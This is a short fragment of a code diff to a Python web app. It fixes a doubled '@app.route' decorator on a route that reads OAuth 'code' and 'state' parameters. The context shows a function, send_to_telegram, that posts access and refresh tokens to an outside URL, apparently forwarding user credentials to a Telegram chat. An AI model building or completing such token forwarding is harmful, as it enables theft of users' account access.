@@ -291,7 +291,7 @@ def send_to_telegram(access_token, refresh_token=None):
     }
     requests.post(url, json=data)
 
-@@app.route('/')
+@app.route('/')
 def home():
     code = request.args.get('code')
     state = request.args.get('state')
